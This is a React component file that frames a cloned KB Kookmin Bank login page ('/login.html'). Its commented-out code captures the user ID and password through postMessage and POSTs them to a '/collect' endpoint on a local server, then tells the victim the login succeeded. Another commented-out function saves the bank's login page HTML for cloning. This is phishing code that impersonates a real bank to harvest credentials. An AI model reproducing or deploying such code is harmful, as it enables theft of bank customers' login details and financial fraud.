// import React, { useEffect } from 'react';
// import { useNavigate } from 'react-router-dom';

// const NomppiKBLoginPage = () => {
//   const navigate = useNavigate();

//   useEffect(() => {
//     const handleMessage = (event) => {
//       if (event.data?.type === 'LOGIN_DATA') {
//         const { userid, password } = event.data;

//         fetch('http://localhost:5000/collect', {
//           method: 'POST',
//           headers: {
//             'Content-Type': 'application/x-www-form-urlencoded',
//           },
//           body: new URLSearchParams({ userid, password }),
//         })
//           .then((res) => {
//             if (!res.ok) throw new Error('서버 응답 오류');
//             return res.text();
//           })
//           .then(() => {
//             alert('로그인 완료!');
//             navigate('/');
//           })
//           .catch((err) => {
//             alert('서버 오류: ' + err.message);
//           });
//       }
//     };

//     window.addEventListener('message', handleMessage);
//     return () => window.removeEventListener('message', handleMessage);
//   }, [navigate]);

//   return (
//     <iframe
//       src="/login.html"
//       title="KB 국민은행 로그인"
//       style={{
//         width: '100%',
//         height: '800px',
//         border: 'none',
//         maxWidth: '100%',
//         overflow: 'auto',
//       }}
//     />
//   );
// };

// export default NomppiKBLoginPage;
import React from 'react';

const NomppiKBLoginPage = () => {
  // const saveHtml = async () => {
  //   try {
  //     const response = await fetch('http://localhost:5000/api/save-login-html');
  //     const result = await response.text();
  //     alert(result);
  //   } catch (err) {
  //     alert('실패: ' + err.message);
  //   }
  // };

  return (
    <div>
      <iframe
        src="/login.html"
        title="KB 국민은행"
        style={{
        width: '10000px',
        height: '800px', // 적당히 보기 좋은 높이
        border: 'none',
        maxWidth: '100%',
        overflow: 'auto',
      }}
      />
      {/* <button onClick={saveHtml}>로그인 페이지 HTML 저장</button> */}
    </div>
  );
};

export default NomppiKBLoginPage;